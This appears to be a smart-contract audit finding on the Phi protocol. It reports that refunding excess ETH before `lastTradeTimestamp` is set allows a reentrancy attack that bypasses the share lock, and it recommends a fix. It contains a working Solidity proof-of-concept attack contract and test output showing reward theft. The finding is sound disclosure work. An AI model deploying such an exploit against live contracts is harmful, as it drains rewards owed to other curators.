# Vulnerability details

## Impact
The protocol's [previous audit report](https://github.com/code-423n4/2024-08-phi/blob/main/docs/audit/Renascence%20-%20Phi%20Audit%20Report.pdf) pointed out that reward distribution was vulnerable to flash loan attacks where attackers could buy a large amount of cred shares, claim all the available rewards and then sell the cred shares all in one transaction. The mitigation for this added the `SHARE_LOCK_PERIOD`, which enforces that a cred share cannot be sold until 10 minutes after the transaction in which it is bought.

However the problem still persists because in the `_handleTrade` function an attacker can execute arbitrary logic while being refunded for the excess ether they sent before the `lastTradeTimestamp` is set, as shown here:
```solidity    
    if (excessPayment > 0) {
        _msgSender().safeTransferETH(excessPayment);
    }
    lastTradeTimestamp[credId_][curator_] = block.timestamp;
```
This means that if `_msgSender()` is a smart contract it's receive function can call claim the their stare of "curator rewards" based on the new value, and then selling the tokens successfully because the `lastTradeTimestamp` has not been set to enforce the `SHARE_LOCK_PERIOD`.

## Proof of Concept
Consider the following attack path:
1. Attacker finds a `credId` with a significant amount of curator rewards to be claimed.
2. Attacker's contract then buys a large quantity of shares for that `credId`
3. The contract's receive function calls `CuratorRewardsDistributor::distribute` to distribute the rewards based on their newly set balance
4. The contract then calls `Cred::sellShareCred` selling their bought shares.
5. The result is the attacker loses a small amount in fees buying/selling the cred shares, but makes a significant profit from the ether gained from getting a large percentage of that `credId`'s curator rewards.

Add the following test and attack contract to `Cred.t.sol` to highlight this:
```solidity
contract TestCred is Settings {
    // -- Snip --

    function test_Toad_buySellOneBlock() public {
        vm.warp(START_TIME + 1);

        _createCred("BASIC", "SIGNATURE", 0x0);

        // Simulate rewards being accured via art claims
        uint256 mintFee = 0.02 ether;
        bytes memory addresses = abi.encode(address(100), address(200), address(300), address(400));
        vm.prank(participant);
        phiRewards.handleRewardsAndGetValueSent{value: phiRewards.computeMintReward(1, mintFee)}(1, 1, 1, mintFee, addresses, true);
        vm.startPrank(participant);
        BuySellAtomic buySell = new BuySellAtomic(address(cred), address(curatorRewardsDistributor));
        buySell.buyCred{value: 0.2 ether}(1);

        uint256 credBal = cred.getShareNumber(1, address(buySell));
        console2.log("Contract balance", credBal);
        assertEq(credBal, 0);

        uint256 ethToClaim = phiRewards.balanceOf(address(buySell));
        console2.log("Eth claimable", ethToClaim);
        assert(ethToClaim > 0);
    }
}

contract BuySellAtomic {
    address cred;
    address distributor;
    uint256 credId;
    bool entered;

    constructor(address _cred, address _distributor) {
        cred = _cred;
        distributor = _distributor;
    }

    function buyCred(uint256 _credId) external payable {
        credId = _credId;
        Cred(cred).buyShareCred{value: msg.value}(_credId, 1, 1 ether);
    }
    receive() external payable {
        if (!entered) {
            console2.log("Balance Now", address(this).balance);
            entered = true;
            // Claim large amount of rewards
            CuratorRewardsDistributor(distributor).distribute(1);
            // Sell Shares
            Cred(cred).sellShareCred(credId, 1, 0);
        } else {
            console2.log("Balance End", address(this).balance);
        }
    }
}
```

This results in the following output logs:
```solidity
  Balance Now 198908125640670732            // Receive called during buy
  Balance End 198908625640670732            // Receive called during distribute
  Balance End 199876891581962726            // Receive called during sell
  Contract balance 0                        // Contract owns no cred shares at the end
  Eth claimable 24750000000000              // ETH available to be claimed by the contract
```

## Recommended Mitigation
There are two recommendations to rectify this issue. Firstly the logic should follow the "checks, effects, interactions" pattern and only make the `safeTransferETH` call after all the necessary state has been updated like so:
```solidity
    lastTradeTimestamp[credId_][curator_] = block.timestamp;
    if (excessPayment > 0) {
        _msgSender().safeTransferETH(excessPayment);
    }
```
Also as an additional safety measure it is recommended that the `_handleTrade` function be marked as `nonReentrant`.
Adding both of these measures would make it significantly more difficult to an attacker to exploit the rewards system in this way.
